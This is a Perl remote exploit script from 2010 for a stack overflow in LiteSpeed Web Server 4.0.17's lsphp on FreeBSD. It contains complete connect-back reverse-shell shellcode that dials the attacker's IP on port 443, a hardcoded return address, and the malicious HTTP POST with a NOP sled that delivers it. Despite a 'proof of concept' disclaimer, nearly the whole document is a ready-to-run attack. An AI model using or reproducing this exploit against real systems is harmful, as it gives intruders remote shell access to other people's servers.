# LiteSpeed Web Server 4.0.17 w/ PHP Remote Exploit for FreeBSD
# bug discovered & exploited by Kingcope
#
# Dec 2010
# Lame Xploit Tested with success on
# FreeBSD 8.0-RELEASE - LiteSpeed WebServer 4.0.17 Standard & Enterprise x86
# FreeBSD 6.3-RELEASE - LiteSpeed WebServer 4.0.17 Standard & Enterprise x86
# FreeBSD 8.0-RELEASE - LiteSpeed WebServer 4.0.15 Standard x86
# can be used against the admin interface (port 7080), too
# Xploit only works on default lsphp binary not the compiled version
#
# this should be exploitable on linux too (on the compiled SAPI version)
# the shipped linux version of lsphp has stack cookies enabled,
# which could be brute forced if there wasn't a null put at the end of
# the exploit buffer. The compiled SAPI version is exploitable, but then
# the offsets differ from box to box, so this time FreeBSD targets only.
# thus on linux this is very tricky to exploit.
# this is a proof of concept, don't try this on real boxes
# see lsapilib.c line 1240
(http://litespeedtech.com/packages/lsapi/php-litespeed-5.4.tgz)

use IO::Socket;

$|=1;

#freebsd reverse shell port 443
#setup a netcat on this port ^^
$bsdcbsc =
        # setreuid, no root here
        "\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80".
        # connect back :>
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53".
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0".
        "\x61\xcd\x80\x31\xd2\x52\x52\x68".
        "\x41\x41\x41\x41\x66\x68\x01\xbb".
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10".
        "\x52\x51\x50\x52\x89\xc2\x31\xc0".
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3".
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80".
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd".
        "\x80\x31\xc0\x31\xdb\x43\x53\x52".
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43".
        "\x53\x52\x50\xb0\x5a\xcd\x80\x31".
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68".
        "\x2f\x62\x69\x6e\x89\xe3\x50\x54".
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0".
        "\xb0\x01\xcd\x80";

sub usage() {
        print "written by kingcope\n";
        print "usage:\n".
                  "litespeed-remote.pl <target ip/host> <target port>
<your ip> <php file on remote host>\n\n".
                  "example:\n".
                  "perl litespeed-remote.pl 192.168.2.3 8088
192.168.2.2 phpinfo.php\n\n";

        exit;
}

if ($#ARGV ne 3) { usage; }

$target = $ARGV[0];
$port = $ARGV[1];
$cbip = $ARGV[2];
$file = $ARGV[3];

($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));

substr($bsdcbsc, 37, 4, $a1 . $a2 . $a3 . $a4);

#my $sock = IO::Socket::INET->new(PeerAddr => $target,
#                                 PeerPort => 8088,
#                                         Proto    => 'tcp');
#$a = "A" x 500;
#print $sock "POST /phpinfo.php HTTP/1.1\r\nHost: 192.168.2.5\r\n\r\n";

#$x = <stdin>;

#$ret = pack("V", 0x28469478); # FreeBSD 7.3-RELEASE
#$ret = pack("V", 0x82703c0); # FreeBSD 6.3-RELEASE
$ret = pack("V", 0x080F40CD); # JMP EDX lsphp

my $sock = IO::Socket::INET->new(PeerAddr => $target,
                                  PeerPort => $port,
                                          Proto    => 'tcp');


$a = "A" x 263 . "AAAA" x 6 . $ret . "C" x 500;
$sc = "\x90" x 3000 . $bsdcbsc;

print $sock "POST /\x90\x90\x90\x90\x90\x90\xeb\x50/../$file?
HTTP/1.1\r\nHost: $target\r\nVVVV: $sc\r\n$a KINGCOPEH4XXU:\r\n\r\n";

while (<$sock>) {
	print;
}